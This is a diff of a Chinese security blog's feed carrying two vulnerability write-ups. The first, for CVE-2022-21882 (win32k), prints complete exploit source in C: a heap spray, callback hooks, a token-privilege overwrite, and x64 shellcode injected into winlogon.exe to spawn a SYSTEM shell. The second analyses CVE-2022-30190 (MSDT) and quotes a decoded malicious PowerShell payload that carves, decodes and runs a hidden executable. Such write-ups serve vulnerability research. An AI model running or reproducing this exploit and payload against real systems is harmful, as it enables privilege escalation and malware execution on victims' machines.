+            DWORD processID = aProcesses[i];
+            CHAR szProcessName[MAX_PATH] = "&lt;unknown&gt;";
+
+            // Get a handle to the process.
+
+            HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION |
+                PROCESS_VM_READ,
+                FALSE, processID);
+
+            // Get the process name.
+
+            if (NULL != hProcess)
+            {
+                HMODULE hMod;
+                DWORD cbNeeded;
+
+                if (EnumProcessModules(hProcess, &amp;hMod, sizeof(hMod),
+                    &amp;cbNeeded))
+                {
+                    GetModuleBaseNameA(hProcess, hMod, szProcessName,
+                        sizeof(szProcessName) / sizeof(TCHAR));
+                }
+            }
+
+            // Print the process name and identifier.
+            if (!lstrcmpA(szProcessName, name))
+            {
+                CloseHandle(hProcess);
+                return (processID);
+            }
+
+            // Release the handle to the process.
+
+            CloseHandle(hProcess);
+        }
+    }
+
+    return 0;
+
+}
+
+void SpawnShell() {
+    HANDLE hSystemProcess = INVALID_HANDLE_VALUE;
+    PVOID  pLibRemote;
+    HMODULE hKernel32 = GetModuleHandleA("Kernel32");
+    DWORD processID;
+    unsigned char shellcode[] =
+        "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52\x51" \
+        "\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52" \
+        "\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0" \
+        "\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed" \
+        "\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88" \
+        "\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44" \
+        "\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48" \
+        "\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1" \
+        "\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44" \
+        "\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49" \
+        "\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a" \
+        "\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41" \
+        "\x59\x5a\x48\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00" \
+        "\x00\x00\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b" \
+        "\x6f\x87\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd\x9d\xff" \
+        "\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47" \
+        "\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x6d\x64\x2e\x65" \
+        "\x78\x65\x00";
+
+
+    if ((processID = getProcessId("winlogon.exe")) == 0)
+    {
+        printf("[Error_%d] Couldn't retrieve process ID...\n", __LINE__);
+        return;
+    }
+    printf("[+] Retrieved process id: %d\n", processID);
+    hSystemProcess = OpenProcess(GENERIC_ALL, false, processID);
+
+    if (hSystemProcess == INVALID_HANDLE_VALUE || hSystemProcess == (HANDLE)0)
+    {
+        printf("[Error_%d] Couldn't open system process...\n", __LINE__);
+        return;
+    }
+    printf("[+] Got a handle on a system Process: %08p\n", hSystemProcess);
+
+
+    pLibRemote = VirtualAllocEx(hSystemProcess, NULL, sizeof(shellcode) * 2, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+
+    if (!pLibRemote)
+    {
+        printf("[Error_%d] Virtual alloc failed !\n", __LINE__);
+        return;
+    }
+
+    printf("[+] Allocation in system process succeded with address %08p\n", pLibRemote);
+
+    if (!WriteProcessMemory(hSystemProcess, pLibRemote, shellcode, sizeof(shellcode), NULL))
+    {
+        printf("[Error_%d] WriteProcessMemory failed !\n", __LINE__);
+        return;
+    }
+
+    HANDLE hThread = CreateRemoteThread(hSystemProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pLibRemote, NULL, 0, NULL);
+
+    printf("[+] Writing in system process succeded\n");
+
+    if (hThread == NULL) {
+        printf("[Error_%d] CreateRemoteThread failed !\n", __LINE__);
+        return;
+    }
+    else
+        printf("[+] Remote thread created !\n");
+    CloseHandle(hSystemProcess);
+}
+
+ULONG64 GetToken() {
+    PSYSTEM_HANDLE_INFORMATION_EX sys_handle_info_ref = NULL;
+    ULONG64 Token = 0;
+    ULONG len = 20;
+    NTSTATUS ntst = 0;
+
+    OpenProcessToken(GetCurrentProcess(), GENERIC_READ, &amp;gb::hToken);
+    if (gb::hToken == INVALID_HANDLE_VALUE) {
+        printf("[Error_%d] GetToken(): OpenProcessToken failed.\n", __LINE__);
+        return 0;
+    }
+    //获取本进程的EPROCESS
+    do {
+        len *= 2;
+        sys_handle_info_ref = (PSYSTEM_HANDLE_INFORMATION_EX)realloc(sys_handle_info_ref, len);
+        ntst = gb::ZwQuerySystemInformation(
+            (SYSTEM_INFORMATION_CLASS)SystemExtendedHandleInformation, sys_handle_info_ref, len, &amp;len);
+    } while (ntst == STATUS_INFO_LENGTH_MISMATCH);
+
+    if (ntst != 0) {
+        printf("[Error_%d] GetToken(): ZwQuerySystemInformation failed.\n", __LINE__);
+        if (sys_handle_info_ref)
+            free(sys_handle_info_ref);
+        return 0;
+    }
+
+    DWORD pid = GetCurrentProcessId();
+    for (int i = 0; i &lt; sys_handle_info_ref-&gt;HandleCount; i++) {
+        if (gb::hToken == sys_handle_info_ref-&gt;Handles[i].HandleValue
+            &amp;&amp; (HANDLE)pid == sys_handle_info_ref-&gt;Handles[i].UniqueProcessId) {
+            Token = (ULONG64)sys_handle_info_ref-&gt;Handles[i].Object;
+            break;
+        }
+    }
+
+    if (sys_handle_info_ref)
+        free(sys_handle_info_ref);
+
+    printf("[+] Found current process token = %p\n", Token);
+    return Token;
+}
+
+
+BOOLEAN Init() {
+    BOOLEAN bRet = TRUE;
+    int offset = 0;
+    DWORD64 next_code = 0;
+
+    __try {
+        gb::g_hUser32 = LoadLibraryA("user32.dll");
+        if (!gb::g_hUser32) {
+            printf("[!] Error: %d, Code = 0x%p", __LINE__, GetLastError());
+            bRet = FALSE;
+            __leave;
+        }
+        //获取u32_IsMenu
+        gb::u32_IsMenu = (IsMenu_t)GetProcAddress(gb::g_hUser32, "IsMenu");
+        if (!gb::u32_IsMenu) {
+            printf("[!] Error: %d, Code = 0x%p", __LINE__, GetLastError());
+            bRet = FALSE;
+            __leave;
+        }
+
+        for (int i = 0; i &lt; 0x100; i++) {
+            PUCHAR tr = (PUCHAR)gb::u32_IsMenu + i;
+            if (*tr == 0xE8)
+            {//找到调用HMValidateHandle的指令位置
+                offset = *(int*)((PCHAR)gb::u32_IsMenu + i + 1);
+                next_code = (DWORD64)gb::u32_IsMenu + i + 5;
+                gb::HMValidateHandle = (HMValidateHandle_t)(next_code + offset);
+                break;
+            }
+        }
+        if (!gb::HMValidateHandle) {
+            printf("[!] Error: Can not find HMValidateHandle!\n");
+            bRet = FALSE;
+            __leave;
+        }
+
+        printf("[+] Found HMValidateHandle = 0x%p\n", gb::HMValidateHandle);
+
+        gb::g_hNtdll = LoadLibraryA("ntdll.dll");
+        if (!gb::g_hNtdll) {
+            printf("[!] Error: %d, Code = 0x%p", __LINE__, GetLastError());
+            bRet = FALSE;
+            __leave;
+        }
+
+        gb::g_hWin32u = LoadLibraryA("win32u.dll");
+        if (!gb::g_hWin32u) {
+            printf("[!] Error: %d, Code = 0x%p", __LINE__, GetLastError());
+            bRet = FALSE;
+            __leave;
+        }
+        
+        gb::NtCallbackReturn = (NtCallbackReturn_t)GetProcAddress(gb::g_hNtdll, "NtCallbackReturn");
+        gb::NtUserMessageCall = (NtUserMessageCall_t)GetProcAddress(gb::g_hWin32u, "NtUserMessageCall");
+        gb::NtUserConsoleControl = (NtUserConsoleControl_t)GetProcAddress(gb::g_hWin32u, "NtUserConsoleControl");
+        gb::ZwQuerySystemInformation = (ZwQuerySystemInformation_t)GetProcAddress(gb::g_hNtdll, "NtQuerySystemInformation");
+        gb::RtlAllocateHeap = (RtlAllocateHeap_t)GetProcAddress(gb::g_hNtdll, "RtlAllocateHeap");
+        if (gb::NtCallbackReturn==0 || gb::NtUserMessageCall==0 || 
+            gb::NtUserConsoleControl==0 || gb::ZwQuerySystemInformation==0 ||
+            gb::RtlAllocateHeap==0) {
+            printf("[!] Error: %d, Code = 0x%p", __LINE__, GetLastError());
+            bRet = FALSE;
+            __leave;
+        }
+    }
+    __finally {
+
+    }
+    return bRet;
+}
+
+int main(int argc,char *argv[]) {
+
+    if (argc &lt;= 1) {
+        printf(
+        "Usage:\n"
+        "         Example: CVE-2022-21882.exe whoami\n"
+        );
+        return 0;
+    }
+
+    WNDCLASSEXW WndClassExW = { 0 };
+
+    ULONG64 TokenAddr = 0;
+
+    if (Init()) {
+
+        TokenAddr = GetToken();
+
+        if (TokenAddr == 0) {
+            printf("[-] Error(%u): GetToken failed.\n");
+            return 0;
+        }
+
+        WndClassExW.hIcon = 0;
+        WndClassExW.hbrBackground = 0;
+        WndClassExW.lpszClassName = 0;
+        WndClassExW.lpfnWndProc = (WNDPROC)WindowProc;
+        WndClassExW.cbSize = sizeof(WNDCLASSEXW);
+        WndClassExW.style = CS_VREDRAW | CS_HREDRAW;;
+        WndClassExW.cbClsExtra = 0;
+        WndClassExW.cbWndExtra = 0x60;
+        WndClassExW.hInstance = GetModuleHandleW(0);
+        WndClassExW.lpszClassName = L"VictimClass";
+        //被覆盖写
+        ATOM atom_vic = RegisterClassExW(&amp;WndClassExW);
+
+        WndClassExW.cbWndExtra = TRIGGERWND_EXTRASIZE;
+        WndClassExW.lpszClassName = L"TriggerClass";
+
+        //触发漏洞
+        ATOM atom_trig = RegisterClassExW(&amp;WndClassExW);
+
+        gb::g_hVictimWnd = CreateWindowExW(NULL,
+            (LPCWSTR)(unsigned __int16)atom_vic,
+            L"VictimWnd",
+            NULL,
+            0,
+            0, 
+            0,
+            0,
+            0,
+            0,
+            GetModuleHandleW(0),
+            0);
+        printf("[+] Created victim windows = 0x%p\n", gb::g_hVictimWnd);
+
+        gb::g_hTriggerWnd = CreateWindowExW(NULL,
+            (LPCWSTR)(unsigned __int16)atom_trig,
+            L"TriggerBug",
+            NULL,
+            0,
+            0,
+            0,
+            0,
+            0,
+            0,
+            GetModuleHandleW(0),
+            0);
+        printf("[+] Created trigger windows = 0x%p\n", gb::g_hTriggerWnd);
+        // 触发漏洞
+        // 获取刚创建的这两个窗口的桌面堆
+        PWND Trigger= gb::HMValidateHandle(gb::g_hTriggerWnd, 1);
+        gb::TriggerDeskHeap = Trigger-&gt;OffsetToDesktopHeap;
+        printf("[+] TriggerDeskHeap's tagWND = 0x%p\n", Trigger);
+        PWND Victim = gb::HMValidateHandle(gb::g_hVictimWnd, 1);
+        gb::VictimDeskHeap = Victim-&gt;OffsetToDesktopHeap;
+        DWORD64 Distance = 0;
+        if (gb::VictimDeskHeap&gt; gb::TriggerDeskHeap) {
+            Distance=gb::VictimDeskHeap - gb::TriggerDeskHeap;
+        }
+        else {
+            Distance = gb::TriggerDeskHeap - gb::VictimDeskHeap;
+        }
+
+        if (Distance &gt;= TRIGGERWND_EXTRASIZE) {
+            printf("[-] Heap spray failed!\n");
+            return 0;
+        }
+
+        printf("[+] VictimDeskHeap's tagWND = 0x%p\n", Victim);
+        printf("[+] TriggerDeskHeap = %p\n", gb::TriggerDeskHeap);
+        printf("[+] VictimDeskHeap = %p\n", gb::VictimDeskHeap);
+
+        // 回调函数
+        SetFuncHook((DWORD64)ClientAllocatWindowClassExtraBytesProxy,(DWORD64)ClientFreeWindowsClassExtraBytesProxy);
+        // 触发漏洞
+        gb::NtUserMessageCall(gb::g_hTriggerWnd, WM_CREATE,0,0, NULL, 0, FALSE);
+
+        // 修改 tagWND_victim-&gt;ExtraBytes = TokenAddr
+        ULONG_PTR Old = SetWindowLongPtrW(gb::g_hTriggerWnd, 0x128+0x10, TokenAddr+0x40);
+        // 修改 Token-&gt;Privileges.Enabled = 0xFFFFFFFFFFFFFFFF
+        SetWindowLongPtrW(gb::g_hVictimWnd, 8, 0xFFFFFFFFFFFFFFFF);
+        // 修改 Token-&gt;Privileges.Present = 0xFFFFFFFFFFFFFFFF
+        SetWindowLongPtrW(gb::g_hVictimWnd, 0, 0xFFFFFFFFFFFFFFFF);
+
+        if (CheckPrivilege(gb::hToken)) {
+            SpawnShell();
+        }
+        else {
+            printf("[+] 提权失败！\n");
+        } 
+
+        // 恢复 tagWND_Victim-&gt;ExtraBytes = Old
+        SetWindowLongPtrW(gb::g_hTriggerWnd, 0x128 + 0x10, Old);
+        // 恢复 tagWND_Trigger-&gt;Styles &amp;= ~0x800
+        SetWindowLongPtrW(gb::g_hTriggerWnd, Distance + 0xE8 + 0x10, Trigger-&gt;dwExStyle);
+        system("pause");
+    }
+    return 0;
+    }<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+
+<p>1.触发越界写入漏洞，修改window对象的cbWndExtra为0xFFFEFFF，使用window对象WndExtra可以访问大内存。</p>
+<p>2.修改另一个窗口的WS_CHILD标志，为另一个窗口设置一个专门构造的Menu(fake menu)</p>
+<p>3.通过GetMenuBarInfo API和假菜单获取任意读取原语。</p>
+<p>4.使用SetWindowLongPtrA API修改另一个窗口对象的ExtraBytes以获得任意写入原语。</p>
+<p>5.通过EPROCESS ActiveProcessLinks找到PID为4的系统eprocess</p>
+<p>6.读取系统token，替换当前进程token</p>
+<p><img src="/2023/03/07/CVE-2022-21882%20win32k%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83%E5%88%86%E6%9E%90/image-20220815173152485.png"></p>
+<p><img src="/2023/03/07/CVE-2022-21882%20win32k%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83%E5%88%86%E6%9E%90/image-20220815173215705.png"></p>
+<p><img src="/2023/03/07/CVE-2022-21882%20win32k%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83%E5%88%86%E6%9E%90/image-20220815173238270.png"></p>
+]]></content>
+      <categories>
+        <category>CVE</category>
+      </categories>
+      <tags>
+        <tag>CVE</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>CVE-2022-30190 MSDT远程代码注入漏洞分析</title>
+    <url>/2023/04/16/CVE-2022-30190%20MSDT%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
+    <content><![CDATA[<h2 id="相关知识"><a href="#相关知识" class="headerlink" title="相关知识"></a>相关知识</h2><h4 id="WTP框架"><a href="#WTP框架" class="headerlink" title="WTP框架"></a>WTP框架</h4><p>windows疑难解答平台（WTP）为ISV、OEM和管理员提供了疑难解答包的过程，这些包用于发现和解决计算机上的问题。WTP框架提供自动化检测修复方式。</p>
+<h4 id="底层结构"><a href="#底层结构" class="headerlink" title="底层结构"></a>底层结构</h4><img src="/2023/04/16/CVE-2022-30190%20MSDT%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220816150216855.png" alt="image-20220816150216855" style="zoom: 67%;">
+
+<ul>
+<li>WTP由两个进程组成，Process1是带UI的Troubleshooting Run-time Engine，Process2用于提供window PowerShell Runtime环境。</li>
+<li>Process2提供的PowerShell运行时环境提供了4条特殊的PowerShell命令：Get-DiagInput、Update-DiagReport、Update-DiagRootCause、Write-DiagProgress</li>
+<li>Troubleshooting Pack运行在Process1和Process2所构建的平台上。</li>
+</ul>
+<h4 id="工作原理"><a href="#工作原理" class="headerlink" title="工作原理"></a>工作原理</h4><ul>
+<li><p>故障排除包是用户可编程部分，本质上是一组针对特定故障的检测修复脚本。Process1(Troubleshooting Run-time Engine)通过故障排除包获取检测脚本检测问题，查出问题交给Process2(PowerShell)运行处理。</p>
+</li>
+<li><p>Process1是msdt.exe，Process2是sdiagnhost.exe</p>
+</li>
+<li><p>sdiagnhost.exe为了给msdt.exe提供运行脚本的能力，注册了IScriptedDiagnosticHost com接口，相应的com方法是RunScript()</p>
+</li>
+<li><p>故障排除包的设计基于三个步骤：检测问题（troubleshooting）、解决问题（resolution）和验证解决方案（verificationg），对应TS、RS、VF三种脚本。</p>
+</li>
+</ul>
+<h4 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h4><p>WTP提供了一系列默认故障排除包，可以在ms-msdt协议里通过-id参数指定。</p>
+<p>CVE-2022-30190使用PCWDiagnostic，用于程序兼容性故障排除。</p>
+<h2 id="0x00-漏洞描述"><a href="#0x00-漏洞描述" class="headerlink" title="0x00 漏洞描述"></a>0x00 漏洞描述</h2><p>Microsoft Office MSDT存在远程代码执行漏洞，攻击者可以利用Office文件中的远程模块功能，访问远程服务器上挂载的恶意HTML文件，之后通过ms-msdt URL来执行恶意powershell代码，漏洞在宏被禁用的情况下依然可以利用。</p>
+<h2 id="0x01-漏洞分析"><a href="#0x01-漏洞分析" class="headerlink" title="0x01 漏洞分析"></a>0x01 漏洞分析</h2><p>CVE-2022-30190本质上是PowerShell代码注入漏洞。MSDT和Powershell的C:\Windows\diagnostics\system\PCW\TS_ProgramCompatibilityWizard.ps1脚本交互，相关的IT_BrowseForFile参数存在命令注入，最终的调用PowerShell动态执行。</p>
+<p><strong>影响版本：</strong></p>
+<pre class="line-numbers language-none"><code class="language-none">Microsoft Windows Server 2008 SP2
+Microsoft Windows 11
+Microsoft Windows Server 2019
+Microsoft Windows 10 1607
+Microsoft Windows Server 20H2
+Microsoft Windows Server 2022
+Microsoft Windows Server 2016 (Server Core installation)
+Microsoft Windows Server 2016 null
+Microsoft Windows 10
+Microsoft Windows 10 1809
+Microsoft Windows Server 2008 R2 SP1
+Microsoft Windows Server 2022 (Server Core installation)
+Microsoft Windows Server 2019 (Server Core installation)
+Microsoft Windows 8.1
+Microsoft Windows 10 20H2
+Microsoft Windows 10 21H2
+Microsoft Windows Server 2012 R2
+Microsoft Windows 7 SP1
+Microsoft Windows RT 8.1 SP0
+Microsoft Windows Server 2012
+Microsoft Windows 10 21H1
+Microsoft Windows Server 2022 Azure Edition Core Hotpatch <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h4 id="样本分析"><a href="#样本分析" class="headerlink" title="样本分析"></a>样本分析</h4><p>样本是docx文件，解压，其中/word/_rels目录下的document.xml.rels文件包含对<a href="https://www.xmlformats.com/office/word/2022/wordprocessingDrawing/RDF842l.html%E7%9A%84%E5%A4%96%E9%83%A8%E5%BC%95%E7%94%A8%E3%80%82">https://www.xmlformats.com/office/word/2022/wordprocessingDrawing/RDF842l.html的外部引用。</a></p>
+<p><img src="/2023/04/16/CVE-2022-30190%20MSDT%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220816163900629.png"></p>
+<p><strong>RDF842l.html原始内容：</strong></p>
+<p>使用了4个参数，IT_RebrowseForFile、IT_LaunchMethod、IT_SelectProgram、IT_BrowseForFile。利用IT_BrowseForFile参数加载了powershell脚本执行恶意功能。4096字节的A填充，是windows诊断工具的缓冲区大小。</p>
+<pre class="line-numbers language-none"><code class="language-none">&lt;!doctype html&gt;
+&lt;html lang="en"&gt;
+&lt;body&gt;
+&lt;script&gt;
+                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      
+&lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>首先使用window.location.href创建窗口，ms-msdt是windows诊断工具，之后调用powershell，执行的内容经过了base64加密</p>
+<p><img src="/2023/04/16/CVE-2022-30190%20MSDT%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220817165023922.png"></p>
+<p>解密得到</p>
+<pre class="line-numbers language-none"><code class="language-none">$cmd = "c:\windows\system32\cmd.exe";Start-Process $cmd -windowstyle hidden -ArgumentList "/c taskkill /f /im msdt.exe";Start-Process $cmd -windowstyle hidden -ArgumentList "/c cd C:\users\public\&amp;&amp;for /r %temp% %i in (05-2022-0438.rar) do copy %i 1.rar /y&amp;&amp;findstr TVNDRgAAAA 1.rar&gt;1.t&amp;&amp;certutil -decode 1.t 1.c &amp;&amp;expand 1.c -F:* .&amp;&amp;rgb.exe";<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>启动隐藏窗口：</p>
+<pre class="line-numbers language-none"><code class="language-none">如果msdt.exe正在运行，终止它
+循环遍历RAR文件中的文件，查找编码CAB文件的Base64字符串
+将Base64字符串编码的cab文件保存1.c
+将1.c cab文件展开到当前目录
+最后执行rgb.exe<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>因此window会无限制执行powershell.如果修改成想要执行的代码，就会导致远程代码执行漏洞。因此，只需修改xml文件，引用网站上的恶意代码就行。</p>
+<h4 id="触发条件"><a href="#触发条件" class="headerlink" title="触发条件"></a>触发条件</h4><p>在Microsoft.Windows.Diagnosis.SDHost.dll里的Microsoft.Windows.Diagnosis.ManagedHost.Run Script()方法实现了IScriptedDiagnosticHost com接口里的RunScript方法，用于给msdt.exe提供执行检测脚本所需要的PowerShell运行时环境，然后重新触发漏洞。RunScript()方法一共被触发了两次，第一次用于调用TS脚本，第二次用于调用RS脚本。</p>
+<p>要触发对RS_ProgramCompatibityWizard.ps1的调用，要先通过TS_ProgramCompatibilityWizard.ps1脚本的检测</p>
+<h4 id="TS-ProgramCompatibilityWizard-ps1"><a href="#TS-ProgramCompatibilityWizard-ps1" class="headerlink" title="TS_ProgramCompatibilityWizard.ps1"></a>TS_ProgramCompatibilityWizard.ps1</h4><p>Get-DiagInput用于从用户获取输入的信息，获取传入的IT_BrowseForFile参数，并赋值给$selectedProgram变量。</p>
+<pre class="line-numbers language-none"><code class="language-none">if(-not($ChoicesAvailable))
+{
+    $selectedProgram = Get-DiagInput -id IT_BrowseForFile
+}
+else
+{
+    $selectedProgram = Get-DiagInput -id IT_SelectProgram -choice $choices
+
+	## If the user chose the option "Not listed" we will ask them to browse for a file
+    if($selectedProgram -eq "NotListed")
+    {
+        $selectedProgram = Get-DiagInput -id IT_BrowseForFile
+    }
+}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>调用Test-Selection方法对$selectedProgram进行检测。使用test_path命令来对路径进行检测，确保路径存在，对于/../返回到根路径之外的路径返回True，要求路径的扩展名为exe和msi。</p>
+<pre class="line-numbers language-none"><code class="language-none">function Test-Selection([string]$appPath)
+{
+    $testresult = $false
+
+    if(($appPath -ne $null) -and -not([String]::IsNullOrEmpty($appPath)))
+    {
+        $testresult = test-path -literalpath $appPath
+
+        if($testresult)
+        {
+            if(-not($type::IsFileProtected($appPath)))
+            {
+                $extension = [System.IO.Path]::GetExtension($appPath)
+                $testresult = ($extension -eq ".exe") -or ($extension -eq ".msi")
+            }
+            else
+            {
+                $testresult = $false
+                Set-Variable -name rebrowseText -value $CompatibilityStrings.Text_FILE_PROTECTED -scope global
+            }
+        }
+    }
+
+    Set-Variable -name appValid -value $testResult -scope global
+}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>从$selectedProgram提取文件名，过滤$符号，防止代码注入。由于脚本直接使用$,$实际会在过滤前被PowerShell引擎解析，所以无法起到过滤$字符的作用。</p>
+<p>正确写法应为 $appName = [System.IO.Path]::GetFileNameWithoutExtension($selectedProgram).Replace(“`$”, “``$”)</p>
+<pre class="line-numbers language-none"><code class="language-none">while(-not($appValid))
+{
+    $InstanceId++
+    $selection = $selectedProgram
+    $selectedProgram = Get-DiagInput -id IT_RebrowseForFile -parameter @{ "SelectedProgram" = $selection; "RebrowseText" = $rebrowseText; "Instance" = $InstanceId }
+    Set-Variable -name rebrowseText -value $CompatibilityStrings.Text_FILE_INVALID -scope global
+    Test-Selection($selectedProgram)
+}
+
+$appName = [System.IO.Path]::GetFileNameWithoutExtension($selectedProgram).Replace("$", "`$")<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
